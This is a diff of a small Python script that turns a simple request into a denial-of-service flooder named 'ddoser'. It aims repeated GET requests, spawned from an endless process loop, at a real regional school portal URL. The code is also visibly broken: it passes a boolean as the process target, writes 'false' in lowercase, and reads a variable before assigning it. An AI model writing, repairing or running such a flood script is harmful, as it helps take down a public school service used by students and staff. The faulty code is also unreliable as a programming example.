@@ -1,10 +1,21 @@
 import requests
-import threading
+import multiprocessing
 
-path = "http://483572c62091.ngrok.io/home"
+def ddoser(path):
+    global ddosing
+    while str(response) == "<Response [200]>":
+        response = requests.get(path)
+        response = requests.get(path + "/home")
+    ddosing = false
+
+
+path = "https://schools.school.mosreg.ru/school.aspx?school=2000000000748"
 
 response = requests.get(path)
-print(response)
+ddosing = True
+while ddosing:
+    process = multiprocessing.Process(target=ddosing, args=(path,))
+    process.start()
 
-while True:
-    pass
+
+print(response)
